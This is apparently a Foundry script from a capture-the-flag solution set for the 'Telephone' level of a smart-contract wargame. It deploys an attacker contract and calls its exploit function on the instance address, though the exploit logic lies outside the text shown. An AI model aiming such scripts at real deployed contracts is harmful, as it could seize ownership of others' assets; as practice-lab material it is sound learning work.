// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "instances/04_telephone.sol";
import "src/04_telephone.sol";

contract AttackerTelephoneScript is Script {
    address telephone = vm.envAddress("INSTANCE");

    function run() external {
        vm.startBroadcast();

        AttackerTelephone attackerTelephone = new AttackerTelephone();
        attackerTelephone.exploit(telephone);

        vm.stopBroadcast();
    }
}
